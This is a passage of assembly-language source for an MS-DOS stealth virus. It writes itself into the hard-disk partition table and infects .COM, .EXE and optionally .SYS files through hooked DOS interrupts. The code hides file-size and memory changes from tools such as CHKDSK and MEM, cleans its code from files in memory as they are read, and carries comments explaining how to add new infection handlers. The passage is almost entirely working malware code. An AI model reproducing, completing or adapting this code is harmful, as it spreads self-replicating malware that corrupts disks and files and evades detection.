    mov     word ptr ds:[si+offset track-offset newp_loader+1],ax       ;save track of available sectors
    mov     word ptr ds:[si+offset side-offset newp_loader+1],dx        ;save side of available sectors
endif

load_new:
    pop     di                                  ;restore partition offset from stack
    pop     cx                                  ;restore partition byte-count from stack
    repz                                    ;repeat until CX = 0...
    db      move_ptype      ;directive at end of code to calculate this     ;store new partition information

ife     inf_boot
    dec     al                                  ;decrement loop count
    jnz     load_new                            ;branch while information sets remain
    inc     ax                                  ;write 1 sector
else
    dec     ax                                  ;decrement loop count
    jnz     load_new                            ;branch while information sets remain
    mov     ax,301h                             ;write 1 sector
endif

    inc     cx                                  ;cylinder 0, sector 1

ife     passive
    call    call_13h                            ;write infected partition table
else
    int     3                                   ;write infected partition table
endif

    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    mov     ax,code_sect_c+300h                         ;number of sectors in code
    xor     bx,bx                               ;set write address to 0
    inc     cx                                  ;cylinder 0, sector 2

ife     passive
    call    call_13h                            ;write viral code
else
    int     3                                   ;write viral code
endif

    dec     cx                                  ;dummy CX
                                        ;(so loop will fall straight through)
no_part:add     di,10h                              ;point to next partition
    loop    find_hdd                            ;repeat while possible partitions remain

no_write:

if      passive
    push    0                                   ;save 0 on stack
    pop     es                                  ;set ES to 0
    mov     si,old_part+4                           ;offset of address of original interrupt 3 address
    mov     di,0ch                              ;offset of interrupt 3 in interrupt table
    db      2eh                                 ;CS:
                                        ;(to avoid having to set DS)
    movsd                                   ;restore original address
endif

if      inf_sys
    push    offset file_end-offset begin                    ;save offset on stack
                                        ;(simluate subroutine call)
    cmp     word ptr cs:[offset exe_buffer-offset begin],0ffffh         ;check file type
    jz      int12h_ret                              ;branch if .SYS file
endif

ife     inf_sys
    push    offset file_end-offset begin                    ;save offset on stack
                                        ;(simluate subroutine call)
endif

test_int12h:
    push    offset save_psp-offset begin                    ;save return address on stack
    xor     si,si                               ;zero SI
    mov     di,toggle_byte                          ;area to store toggle data
    test    byte ptr cs:[di],int12h_flag                    ;check interrupt 12h status
    jnz     get_psp                             ;branch if interrupt 12h already hooked
    mov     ds,si                               ;set DS to 0
    mov     word ptr ds:[si+48h],offset new_12h-offset begin        ;store new offset
    mov     word ptr ds:[si+4ah],cs                     ;store new code segment
                                        ;(hook interrupt 12h to hide memory change)
;             if interrupt 12h is hooked from the partition table,
;                MS-DOS v6.xx will overwrite this code

ife     int12h_flag-1
    inc     byte ptr cs:[di]                        ;specify that interrupt 12h has been hooked
else
    or      byte ptr cs:[di],int12h_flag                    ;specify that interrupt 12h has been hooked
endif

get_psp:mov     ah,51h                              ;subfunction to retrieve PSP segment
    jmp     call_21h                            ;retrieve PSP segment

save_psp:
    mov     ds,bx                               ;move PSP segment into DS

ife     inf_sys
  if      res_umb
    test    byte ptr cs:[di],useumb_flag                    ;check where code is loaded
    jz      int12h_seg                              ;branch if code loaded high
  endif
else
    test    byte ptr cs:[di],device_flag                    ;check where code is loaded
    jz      int12h_seg                              ;branch if code loaded from .SYS file
endif

    mov     ax,160ah                            ;subfunction to get windows version
    int     2fh                                 ;get windows version
    test    ax,ax                               ;check windows status
    jz      int12h_seg                              ;branch if windows executing
    add     word ptr ds:[si+2],code_resp_c                  ;restore top of free memory

;             programs that use the top of memory value in the PSP
;          (which has just been restored to implement memory stealth)
;              will crash the machine, unless Windows is running.
;                      examples include:
;               PKWARE Inc's PKLITE v0.anything
;                   Borland's TLINK

;  this is not a problem if the code is loaded high, or from a device driver
; this form of stealth does fool CHKDSK and MEM, so you should leave it there

int12h_seg:
    push    ds                                  ;save PSP segment on stack
    pop     es                                  ;restore PSP segment from stack

int12h_ret:
    ret                                     ;return from subroutine

if      passive
terminate:
    test    byte ptr cs:[toggle_byte],int21h_flag               ;check interrupt 21h status
    jz      end_int21h                              ;branch if interrupt 21h is not executing
                                        ;(for compability with interrupt 20h, et al)
intro_21h:
    pushf                                   ;save flags on stack
    call    hook_interrupt                          ;hook interrupt
    xor     byte ptr cs:[toggle_byte],int21h_flag               ;toggle interrupt 21h status

  ife     int21h_flag-80h
    js      exec_int21h                             ;branch if interrupt 21h is executing
  else
    test    byte ptr cs:[toggle_byte],int21h_flag               ;check interrupt 21h status
    jnz exec_int21h                         ;branch if interrupt 21h is executing
  endif

    cmp     dx,4b00h                            ;check requested operation
    jz      exec_child                              ;branch if execute
    popf                                    ;restore flags from stack

end_int21h:
    retf    2                                   ;return from interrupt with flags set

exec_child:
    mov     bx,scratch_area                         ;area containing parameter block
    lss     sp,dword ptr cs:[bx]                        ;restore original stack address
    pop     ax                                  ;restore passed parameter from stack
    jmp     dword ptr cs:[bx+4]                         ;branch to host code

exec_int21h:
    push    cs                                  ;save code segment on stack
    push    offset intro_21h-offset begin                   ;save offset on stack
                                        ;(simulate interrupt call)
endif

int21h_subfn:
    push    si                                  ;save SI on stack
    pusha                                   ;save all registers on stack
    mov     cx,(offset call_21h-offset op_table)/3              ;opcode table length
    mov     si,offset op_table-offset begin-2                   ;offset of table of opcodes

ife     passive
    cld                                     ;set index direction to forward
                                        ;(just in case)
endif

find_op:inc     si                                  ;skip low byte of opcode address
    inc     si                                  ;skip high byte of opcode address

;  using CMPSW here, to save a byte, will result in a system hang, if DI=FFFFh

    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    lodsb                                   ;retrieve opcode from table
    cmp     al,ah                               ;check opcode
    loopnz  find_op                             ;branch if not handled but opcodes remain
    push    word ptr cs:[si]                        ;save handler address on stack
    mov     bp,sp                               ;point to current top of stack
    pop     word ptr ss:[bp+12h]                        ;restore handler address from stack
                                        ;(saves handler address at top of stack)
                                        ;(simulate subroutine call)
    popa                                    ;restore all registers from stack
    ret                                     ;return from subroutine

op_table:
    db      11h                                 ;find first (FCB)
    dw      offset hide_length-offset begin
    db      12h                                 ;find next (FCB)
    dw      offset hide_length-offset begin

if      anti_pig
    db      36h                                 ;get free disk space
    dw      offset fake_space-offset begin
endif

    db      3eh                                 ;close file
    dw      offset do_close-offset begin
    db      3fh                                 ;read file
    dw      offset do_disinf-offset begin
    db      40h                                 ;write file
    dw      offset do_disinf-offset begin
    db      42h                                 ;set file pointer
    dw      offset check_disinf-offset begin
    db      4bh                                 ;load file
    dw      offset check_infect-offset begin
    db      4eh                                 ;find first (DTA)
    dw      offset hide_length-offset begin
    db      4fh                                 ;find next (DTA)
    dw      offset hide_length-offset begin
    db      57h                                 ;get/set file date and time
    dw      offset fix_time-offset begin

default_handler:
    db      0                   ;this must not be removed       ;corresponds to anything else

ife     passive
    dw      offset cmp_subfn-offset begin   ;this must not be removed
else
    dw      offset jfar_21h-offset begin    ;this must not be removed
endif

;              adding new opcode handlers is very simple -
;        simply insert the value of the opcode to intercept (AH only!),
;          and the address of the handler, ABOVE the default handler

call_21h:
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset known_ret-offset begin                   ;save offset of a known RET on stack
                                        ;(simulate interrupt call)
ife     passive
cmp_subfn:
    cmp     ah,00                               ;check subfunction number
                                        ;(the value here is altered as required)
    ja      jfar_21h                            ;branch if greater than largest file subfunction

jfar_1: db      0eah                                ;jmp xxxx:xxxx
    dd      0                                   ;original interrupt 21h address here
endif

jfar_21h:
    db      0eah                                ;jmp xxxx:xxxx
    dd      0                                   ;original interrupt 21h address here

hide_length:
    push    ax                                  ;save requested operation on stack
    call    call_21h                            ;find file
    pushf                                   ;save flags on stack
    push    bp                                  ;save BP on stack
    mov     bp,sp                               ;point to current top of stack
    test    byte ptr ss:[bp+5],40h                      ;check requested operation
    jz      save_code                               ;branch if FCB find

;       this saves virtually duplicating this procedure for AH=4Eh,4Fh

    push    word ptr ss:[bp+2]                          ;save flags on stack
    pop     word ptr ss:[bp+0ah]                        ;restore flags from stack (save as original)

save_code:
    mov     word ptr ss:[bp+4],ax                       ;save return code on stack
    lahf                                    ;store flags in AH
    pop     bp                                  ;restore BP from stack
    popf                                    ;restore flags from stack
    test    al,al                               ;check return code
    jnz     quit_hide                               ;branch if error occurred
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    push    bx                                  ;save BX on stack
    sahf                                    ;store AH in flags
    pushf                                   ;save flags on stack
    jnz     skip_chkdsk                             ;branch if chkdsk check irrelevent
    call    get_psp                             ;retrieve PSP segment
    mov     es,bx                               ;move PSP segment into ES
    cmp     word ptr es:[16h],bx                        ;compare current PSP with parent PSP
    jnz     nohide                              ;branch if PSPs differ
                                        ;(this prevents CHKDSK errors!)
skip_chkdsk:
    mov     ah,2fh                              ;subfunction to retrieve DTA address
    mov     bx,dx                               ;move offset of FCB into BX
    mov     al,byte ptr ds:[bx]                         ;retrieve FCB type
    call    call_21h                            ;retrieve DTA address
    inc     al                                  ;check FCB type
    jnz     time_adjust                             ;branch if not extended FCB
    add     bx,7                                ;allow for additional bytes

time_adjust:
    popf                                    ;restore flags from stack
    pushf                                   ;save flags on stack
    jz      getime                              ;branch if FCB find
    dec     bx                                  ;adjust offset for DTA find

getime: push    es                                  ;save DTA segment on stack
    pop     ds                                  ;restore DTA segment from stack
    mov     al,byte ptr ds:[bx+17h]                     ;retrieve file time from FCB
    and     al,1fh                              ;convert time to seconds only
    sub     al,1dh                              ;subtract 58 seconds
    jbe     nohide                              ;branch if file is not infected
    sub     byte ptr ds:[bx+17h],al                     ;set 58 seconds
    popf                                    ;restore flags from stack
    pushf                                   ;save flags on stack
    jz      adjust_size                             ;branch if FCB find
    dec     bx
    dec     bx                                  ;adjust offset for DTA find

adjust_size:
    sub     dword ptr ds:[bx+1dh],code_byte_c                   ;hide file length increase

nohide: popf                                    ;restore flags from stack
    pop     bx                                  ;restore BX from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

quit_hide:
    pop     ax                                  ;restore return code from stack
    iret                                    ;return from interrupt

check_infect:
    cmp     al,2                                ;reserved...

if      passive
    jz      jfar_21h                            ;branch to original interrupt 21h handler
else
    jz      jfar_1                              ;branch to original interrupt 21h handler
endif

    cmp     al,3                                ;load overlay...

if      passive
    ja      jfar_21h                            ;branch to original interrupt 21h handler
else
    ja      jfar_1                              ;branch to original interrupt 21h handler
endif

    push    es                                  ;save ES on stack
    push    ds                                  ;save DS on stack
    push    bp                                  ;save BP on stack
    push    di                                  ;save DI on stack
    push    si                                  ;save SI on stack
    push    dx                                  ;save DX on stack
    push    cx                                  ;save CX on stack
    push    bx                                  ;save BX on stack
    push    ax                                  ;save AX on stack
    push    ax                                  ;save requested operation on stack
    push    bx                                  ;save parameter block offset on stack
    call    get_psp                             ;get current PSP segment
    mov     fs,bx                               ;store PSP segment in FS
    pop     bx                                  ;restore parameter block offset from stack
    pop     ax                                  ;restore requested operation from stack

ife     inf_sys
    test    al,al                               ;check requested operation
    jnz     debug_load                              ;branch if load only or load overlay
endif

;                 device drivers are loaded with 4B03h
;         if you don't support device drivers, do NOT alter the code
;          otherwise, device drivers will be infected as .COM files

    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    and     byte ptr cs:[toggle_byte],not suffix_flag               ;specify file to be infected
    push    offset attrib_cont-offset begin                 ;save offset on stack
                                        ;(simulate subroutine call)
hook_24h:
    mov     ax,offset new_24h-offset begin                  ;offset of new interrupt 24h handler

ife     passive
    mov     cx,cs                               ;code segment of new interrupt 24h handler
    jmp     store_24h                               ;branch to hook interrupt 24h
else
    db      38h                                 ;dummy operation to mask MOV
endif

restore_24h:
    mov     ax,"MG"     ;(correct order when dumped)            ;offset of original interrupt 24h handler
                                        ;(the value here is altered as required)
ife     passive
    mov     cx,"MG"     ;(correct order when dumped)            ;code segment of original interrupt 24h handler
                                        ;(the value here is altered as required)
store_24h:
endif

    push    0                                   ;save 0 on stack
    pop     ds                                  ;set DS to 0
    mov     si,90h                              ;offset of interrupt 24h in interrupt table
    xchg    ax,word ptr ds:[si]                         ;exchange old offset with new offset
    mov     word ptr cs:[offset restore_24h-offset begin+1],ax          ;save old interrupt 24h offset
    lodsw                                   ;skip 2 bytes in source

ife     passive
    xchg    cx,word ptr ds:[si]                         ;exchange old code segment with new code segment
    mov     word ptr cs:[offset restore_24h-offset begin+4],cx          ;save old interrupt 24h code segment
else
    mov     ax,word ptr ds:[si]                         ;retrieve old interrupt 24h segment
    xchg    ax,word ptr cs:[old21h_code+3]                  ;exchange old segment with new segment
    mov     word ptr ds:[si],ax                         ;save old interrupt 24h segment
endif

hook_ret:
    ret                                     ;return from subroutine

attrib_cont:
    push    es                                  ;save ES on stack
    pop     ds                                  ;restore DS from stack
    mov     ax,3d00h                            ;subfunction to open file
    call    call_21h                            ;open file
    jb      bad_op                              ;branch if error
    xchg    bx,ax                               ;move handle number into BX
    push    offset bad_rd-offset begin                      ;save offset on stack
                                        ;(simulate subroutine call)
check_file:
    call    check_seconds                           ;check if file already infected
    jz      hook_ret                            ;branch if file is already infected
    push    ax                                  ;save file time on stack
    push    dx                                  ;save file date on stack
    call    infect                              ;infect file
    pop     dx                                  ;restore file date from stack
    pop     cx                                  ;restore file time from stack
    jb      hook_ret                            ;branch if error
    mov     ax,5701h                            ;subfunction to set file date and time

jmp_21h_1:
    jmp     call_21h                            ;set file date and time

bad_rd: mov     ah,3eh                              ;subfunction to close file
    call    call_21h                            ;close file

bad_op: call    restore_24h                             ;restore interrupt 24h
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

if      inf_sys
    test    al,al                               ;check requested operation
    jnz     debug_load                              ;branch if not load and execute
endif

    push    ds                                  ;save DS on stack
    push    es                                  ;save parameter block segment on stack
    pop     ds                                  ;restore parameter block segment from stack
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    inc     ax                                  ;set operation to load only
    mov     cx,7                                ;parameter block byte-count
    mov     si,bx                               ;move offset of parameter block into SI
    mov     bx,header_buffer+0ah                        ;area to store parameter block
    mov     di,bx                               ;move offset of area into DI
    repz    movsw                               ;save parameter block
    pop     ds                                  ;restore DS from stack
                                        ;(simulate interrupt call)
debug_load:
    push    bx                                  ;save BX on stack
    call    call_21h                            ;load file
    mov     bp,sp                               ;store current stack pointer in BP
    xchg    ax,word ptr ss:[bp+2]                       ;exchange return code with requested operation
    mov     word ptr ss:[bp+4],bx                       ;save destroyed BX
    xchg    dx,word ptr ss:[bp+8]                       ;exchange destroyed DX with original DX
    xchg    bp,ax                               ;store requested operation in BP
    pop     bx                                  ;restore DX from stack
    jb      debug_ret                               ;branch if error
    mov     word ptr fs:[2eh],sp                        ;set register table offset
    mov     ax,3d00h                            ;subfunction to open file
    push    bx                                  ;save BX on stack
    call    call_21h                            ;open file for read only
    xchg    bx,ax                               ;move handle number into BX
    push    offset restore_header-offset begin                  ;save offset on stack
                                        ;(simulate subroutine call)
check_seconds:
    mov     ax,5700h                            ;subfunction to retrieve file date and time
    call    call_21h                            ;retrieve file date and time
    mov     ax,cx                               ;move seconds into AX
    or      al,1fh                              ;set entire seconds field
    xor     cl,al                               ;check for 62 seconds
    ret                                     ;return from subroutine

restore_header:
    pushf                                   ;save result on stack
    call    read_header                             ;read first 18h bytes
    mov     ah,3eh                              ;subfunction to close file
    call    call_21h                            ;close file
    xchg    bp,dx                               ;area containing original header
    popf                                    ;retrieve infection result from stack
    pop     bx                                  ;restore BX from stack
    jnz     okay_debug                              ;branch if file is not infected
    mov     ds,word ptr es:[bx]                         ;get destination segment
    xor     di,di                               ;set destination offset to 0
    cmp     dl,3                                ;check requested operation
    jz      test_debug                              ;branch if load overlay
    lds     di,dword ptr es:[bx+12h]                    ;retrieve address of child process

test_debug:

ife     inf_sys
    lea     si,word ptr [di+offset exe_buffer-offset begin+3]           ;offset of original .EXE code
    cmp     byte ptr cs:[bp],0e9h                       ;check file type
    jnz     debug_exe                               ;branch if .EXE file
    add     si,word ptr ds:[di+1]                       ;point at original header
else
    lea     si,word ptr [di+offset exe_buffer-offset begin]         ;offset of original .EXE code
    cmp     word ptr cs:[bp],"ZM"                       ;check file type
    jz      debug_exe                               ;branch if .EXE file
    cmp     byte ptr ds:[di],0e9h                       ;check file type
    jz      debug_com                               ;branch if .COM file
    add     si,word ptr ds:[di+6]                       ;offset of original .SYS code
    jmp     set_restore                             ;branch to restore .SYS file code

debug_com:
    add     si,word ptr ds:[di+1]                       ;get offset of code in .COM file
    lodsw
    inc     si                                  ;modifier for .COM file jump

set_restore:
endif

    push    ds                                  ;save initial code segment on stack
    pop     es                                  ;restore initial code segment from stack

ife     inf_sys
    movsb
    movsw                                   ;restore original 3 bytes of .COM file
    sub     si,offset exe_buffer-offset begin+3                 ;offset of viral code
else
    movsd                                   ;restore first 4 bytes (for .COM files)
    movsd                                   ;restore next 4 bytes (for .SYS files)
    sub     si,offset exe_buffer-offset begin+8                 ;point at original header
endif

    push    si                                  ;save viral code offset on stack
    jmp     clear_area                              ;branch to clear memory of code

debug_exe:
    cmp     dl,3                                ;restore requested operation result from stack
    jnz     disinf_exe                              ;branch if not load overlay
    mov     ax,ds                               ;move DS into AX
    add     ax,word ptr cs:[bp+16h]                     ;add initial CS
    mov     es,ax                               ;move destination segment into ES
    push    word ptr cs:[bp+14h]                        ;save initial IP on stack
    jmp     clear_area                              ;branch to clear memory of code

disinf_exe:

ife     inf_sys
    add     si,0bh                              ;point to original file header
else
    add     si,0eh                              ;point to original file header
endif

    lea     di,word ptr [bx+0eh]                        ;offset of end of original parameter block
    call    get_psp                             ;retrieve PSP segment
    add     bx,10h                              ;point to first allocated segment
    lodsw                                   ;retrieve stack segment
    add     ax,bx                               ;relocate for actual memory segment
    xchg    cx,ax                               ;store stack segment in CX
    lodsw                                   ;retrieve stack pointer
    dec     ax                                  ;reduce stack pointer by 1
    dec     ax                                  ;reduce stack pointer by 1
    stosw                                   ;store stack pointer in parameter block
    mov     gs,cx                               ;store stack segment in FS
    xchg    bp,ax                               ;store stack pointer in BP
    mov     word ptr gs:[bp],0                          ;simulate pass parameter to child process
    xchg    cx,ax                               ;store stack segment in AX
    stosw                                   ;save stack segment in parameter block
    lodsw                                   ;skip checksum (waste of 2 bytes!)
    push    word ptr es:[di]                        ;save instruction pointer on stack
    movsw                                   ;store instruction pointer in parameter block
    lodsw                                   ;retrieve code segment
    add     ax,bx                               ;relocate for actual memory segment
    stosw                                   ;store code segment in parameter block
    push    ds                                  ;save initial code segment on stack
    pop     es                                  ;restore initial code segment from stack

clear_area:
    xor     ax,ax                               ;set store byte to 0
    mov     cx,code_word_c                          ;number of words to clear
    pop     di                                  ;restore viral code offset from stack
    repz    stosw                               ;clear viral code from host file in memory

okay_debug:
    cmp     dl,3                                ;check requested operation
    jz      debug_ret                               ;branch if load overlay
    call    test_int12h                             ;check if interrupt 12h already hooked
    mov     bp,sp                               ;store current stack pointer in BP

ife     passive
    lds     ax,dword ptr ss:[bp+12h]                    ;retrieve termination address
else
    lds     ax,dword ptr ss:[bp+18h]                    ;retrieve termination address
endif

    test    dl,dl                               ;check requested operation
    jnz     set_terminate                           ;branch if not load and execute
    push    cs                                  ;store CS on stack
    pop     ds                                  ;restore CS from stack
    mov     ax,offset terminate-offset begin                ;offset of new termination handler

if      anti_pig
    mov     byte ptr ds:[offset fake_drive-offset begin+1],dl           ;clear drive number
endif

set_terminate:
    mov     di,0ah                              ;offset of termination handler address
    stosw                                   ;store new termination handler offset
    mov     ax,ds                               ;store termination segment in AX
    stosw                                   ;store new termination handler segment
    push    es                                  ;save ES on stack
    pop     ds                                  ;restore ES from stack
    jnz     debug_ret                               ;branch if not load and execute

ife     passive
    push    ss                                  ;save SS on stack
    pop     es                                  ;restore SS from stack
    mov     cl,0ch                              ;number of words to move
    mov     si,sp                               ;point to current bottom of stack
    sub     sp,6                                ;adjust new bottom of stack
    mov     di,sp                               ;point to new bottom of stack
    db      36h                                 ;SS:
                                        ;(to avoid having to set DS)
    repz    movsw                               ;move register table
                                        ;(duplicates return address to allow IRET)
    mov     word ptr fs:[2eh],sp                        ;set register table offset
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore ES from stack
    mov     bx,scratch_area                         ;area containing parameter block
    lss     sp,dword ptr cs:[bx]                        ;restore original stack address
    pop     ax                                  ;restore passed parameter from stack
    jmp     dword ptr cs:[bx+4]                         ;branch to host code
else
    jmp     dword ptr ss:[bp+12h]                       ;return from interrupt
endif

debug_ret:
    pop     ax                                  ;restore AX from stack
    pop     bx                                  ;restore BX from stack
    pop     cx                                  ;restore CX from stack
    pop     dx                                  ;restore DX from stack
    pop     si                                  ;restore SI from stack
    pop     di                                  ;restore DI from stack
    pop     bp                                  ;restore BP from stack
    pop     ds                                  ;restore DS from stack
    pop     es                                  ;restore ES from stack

ife     passive
terminate:
endif

    retf    2                                   ;return from interrupt with flags set

if      anti_pig
fake_space:
    push    ds                                  ;save DS on stack
    push    cs                                  ;save CS on stack
    pop     ds                                  ;retrieve CS from stack
    mov     al,dl                               ;move drive number into AL
    test    al,al                               ;check drive number
    jnz     fake_drive                              ;branch if not default drive
    mov     ah,19h                              ;subfunction to get current drive
    call    call_21h                            ;get current drive
    inc     ax                                  ;skip default drive

fake_drive:
    cmp     al,0                                ;check current drive
    jz      return_space                            ;branch if space already retrieved
    mov     byte ptr ds:[offset fake_drive-offset begin+1],al           ;save current drive
    mov     ah,36h                              ;subfunction to get free disk space
    call    call_21h                            ;get free disk space
    push    si                                  ;save SI on stack
    mov     si,offset return_space-offset begin+1               ;offset of area to store disk space
    mov     word ptr ds:[si],ax                         ;store sectors per cluster
    mov     word ptr ds:[si+3],bx                       ;store number of free clusters
    mov     word ptr ds:[si+6],cx                       ;store bytes per sector
    mov     word ptr ds:[si+9],dx                       ;store total clusters on drive
    pop     si                                  ;restore SI from stack
    jmp     return_space                            ;flush cache

return_space:
    mov     ax,"MG"     ;(correct order when dumped)            ;set sectors per cluster
    mov     bx,"MG"     ;(correct order when dumped)            ;set number of free clusters
    mov     cx,"MG"     ;(correct order when dumped)            ;set bytes per sector
    mov     dx,"MG"     ;(correct order when dumped)            ;set total clusters on drive
    pop     ds                                  ;restore DS from stack
    iret                                    ;return from interrupt
endif

new_24h:mov     al,3                                ;abort on critical error (for interrupt 24h)
    iret                                    ;return from interrupt

infect: mov     ax,1220h                            ;subfunction to get address of JFT
    int     2fh                                 ;get address of JFT
    mov     ax,1216h                            ;subfunction to get address of SFT
    push    bx                                  ;save handle number on stack
    mov     bl,byte ptr es:[di]                         ;get SFT number
    int     2fh                                 ;get address of SFT
    pop     bx                                  ;restore handle number from stack
    or      byte ptr es:[di+5],bh                       ;check device information

;this is fairly safe - if handle is greater than 255, the following will happen:

;             if it's a device, the redirection might be altered,
;              that's okay because it will be closed immediately

;            if it's a file, the drive might be altered... too bad
;              that's okay too - get a read error, close the file

    js      sml_file                            ;branch if device (CON, PRN, etc)

; this check is required because devices can be opened and closed like files!
;           (and a read of CON is a wait for keyboard input)

    mov     byte ptr es:[di+2],2                        ;set open mode to read/write in SFT
    push    offset infect_cont-offset begin                 ;save return address on stack

read_header:
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     ah,3fh                              ;subfunction to read from file
    mov     cx,18h                              ;number of bytes in header
    mov     dx,header_buffer                        ;offset of original header
    jmp     jmp_21h_1                               ;read .EXE header

infect_cont:
    xor     ax,cx                               ;ensure all bytes read
    jnz     sml_file                            ;branch if error or file smaller than 18h bytes
    push    ds                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    mov     ax,"MZ"                             ;set initial header ID to 'ZM'
    mov     si,dx                               ;move offset of original buffer into SI

ife     inf_sys
    cmp     word ptr ds:[si],ax                         ;check contents of header
else
    mov     bp,word ptr ds:[si]                         ;retrieve contents of header
    cmp     ax,bp                               ;check contents of header
endif

    xchg    ah,al                               ;switch to 'MZ'
    jz      save_type                               ;branch if header contains 'ZM'

ife     inf_sys
    cmp     word ptr ds:[si],ax                         ;check if header contains 'MZ'
else
    cmp     ax,bp                               ;check if header contains 'MZ'
endif

save_type:
    pushf                                   ;save file type result on stack
    mov     di,offset exe_buffer-offset begin                   ;offset of area to store original header
    repz    movsb                               ;save header
    mov     di,dx                               ;move offset of original buffer into DI

ife     inf_sys
    jnz     check_suffix                            ;branch if not .EXE file
else
    jnz     check_sys                               ;branch if not .EXE file
endif

    mov     word ptr ds:[di],ax                         ;save 'MZ' in header

ife     inf_sys
    jmp     find_eof                            ;branch to get file size
else
    db      0b0h                                ;dummy operation to mask INC

check_sys:
    inc     bp                                  ;check file type
    jz      find_eof                            ;branch if .SYS file
endif

check_suffix:
    test    byte ptr ds:[di+toggle_byte-header_buffer],suffix_flag      ;check suffix flag
    jnz     not_exe                             ;branch if not executable suffix

find_eof:
    cwd                                     ;set low file pointer position to 0
    call    set_efp                             ;subfunction to set file pointer
    mov     word ptr ds:[di+scratch_area-header_buffer],ax          ;save low file size
    mov     word ptr ds:[di+scratch_area-header_buffer+2],dx        ;save high file size
    popf                                    ;restore file type result from stack
    jz      overlay_check                           ;branch if .EXE file
    cmp     ax,com_byte_c+1                         ;check size of file + virus
    jnb     sml_file                            ;branch if maximum file size exceeded
    push    di                                  ;save offset of header on stack

if      inf_sys
    test    bp,bp                               ;check file type
    jnz     save_jmp                            ;branch if not .SYS file
    add     di,6                                ;point to offset of interrupt in header
    jmp     save_init                               ;branch to save new interrupt handler offset

save_jmp:
endif

    mov     byte ptr ds:[di],0e9h                       ;save initial jump in file
    inc     di                                  ;skip 1 byte in destination
    sub     ax,3                                ;calculate offset of viral code in file

save_init:
    stosw                                   ;store offset of jump to viral code in file
    pop     di                                  ;restore offset of header from stack
    jmp     ok_com                              ;branch to write viral code

not_exe:pop     ax                                  ;discard 2 bytes from stack

sml_file:
    stc                                     ;specify error occurred
    ret                                     ;return from subroutine

overlay_check:
    cmp     word ptr ds:[di+0ch],cx                     ;check value of maxalloc
    jz      sml_file                            ;branch if load to top of memory
    mov     ch,2                                ;set divisor to 200h
    div     cx                                  ;calculate number of 512-byte pages
    test    dx,dx                               ;check last page size
    jz      skip_page                               ;branch if 512-byte aligned
    inc     ax                                  ;add last page to count

skip_page:
    cmp     word ptr ds:[di+4],ax                       ;check high file size
    jnz     sml_file                            ;branch if file contains overlay data
    cmp     word ptr ds:[di+2],dx                       ;check low file size
    jnz     sml_file                            ;branch if file contains overlay data
    les     ax,dword ptr ds:[di+scratch_area-header_buffer]         ;retrieve file size
    mov     dx,es                               ;move high file size into DX
    push    ax                                  ;save low file size on stack
    push    dx                                  ;save high file size on stack
    add     ax,code_byte_c                          ;add code byte count
    adc     dx,0                                ;calculate new file size
    div     cx                                  ;calculate number of 512-byte pages
    test    dx,dx                               ;check last page size
    jz      save_size                               ;branch if 512-byte page aligned
    inc     ax                                  ;add last page to count

save_size:
    mov     word ptr ds:[di+2],dx                       ;store number of bytes in last page
    mov     word ptr ds:[di+4],ax                       ;store number of pages
    pop     dx                                  ;restore high file size from stack
    pop     ax                                  ;restore low file size from stack
    mov     cx,10h                              ;number of bytes in a paragraph
    div     cx                                  ;convert header size from paragraphs to bytes
    sub     ax,word ptr ds:[di+8]                       ;subtract header size from new file size
    mov     word ptr ds:[di+14h],dx                     ;store new initial instruction pointer
    mov     word ptr ds:[di+16h],ax                     ;store new inital code segment
    add     dx,stack_byte_c                         ;set stack pointer to end of viral code
    mov     word ptr ds:[di+0eh],ax                     ;store new initial stack pointer
    mov     word ptr ds:[di+10h],dx                     ;store new initial stack segment
    xor     dx,dx                               ;set write offset to 0

ok_com: mov     cx,code_byte_c                          ;number of bytes in viral code
    call    write_file                              ;write viral code
    push    offset write_cont-offset begin                  ;save return address on stack

set_zfp:xor     cx,cx                               ;set high file pointer position to 0
    mov     dx,cx                               ;set low file pointer position to 0

set_fp: mov     ax,4200h                            ;subfunction to set file pointer
    db      38h                                 ;dummy operation to mask MOV

set_efp:mov     ax,4202h                            ;subfunction to set file pointer

jmp_21h_2:
    jmp     call_21h                            ;set file pointer

write_cont:
    mov     dx,di                               ;move address of header into DX

write_cx:
    mov     cx,18h                              ;number of bytes in header

write_file:
    mov     ah,40h                              ;subfunction to write file
    jmp     jmp_21h_2                               ;write new file header

do_close:
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    call    hook_24h                            ;hook interrupt 24h
    call    set_zfp                             ;set file pointer to start of file
    or      byte ptr cs:[toggle_byte],suffix_flag               ;update suffix flag in toggle
                                        ;(clear if executable, set if not)
    call    check_file                              ;check if file already infected
    call    restore_24h                             ;restore interrupt 24h
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

close_file:

ife     passive
    jmp     jfar_1                              ;close file
else
    jmp     jfar_21h                            ;close file
endif

check_disinf:
    cmp     al,2                                ;check requestion operation
    jnz     close_file                              ;branch if not set from end of file

do_disinf:
    pusha                                   ;save all registers on stack
    call    check_seconds                           ;check if file already infected
    popa                                    ;restore all registers from stack

ife     anti_rec
    jnz     close_file                              ;branch if file is not infected
else
    jz      check_dis                               ;branch if file is infected
    push    di                                  ;save DI on stack
    mov     di,dx                               ;store DX in DI
    cmp     word ptr ds:[di+1feh],0aa55h                    ;check for partition table checksum
    pop     di                                  ;restore DI from stack
    jnz     close_file                              ;branch if checksum not found
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore ES from stack
    mov     cx,8                                ;number of words to move
    mov     si,offset new_part-offset begin                 ;offset of new partition information
    mov     di,1beh                             ;offset of active partition
    add     di,dx                               ;allow for initial offset
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    repz    movsw                               ;copy new partition information
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack

jfar_21h_3:
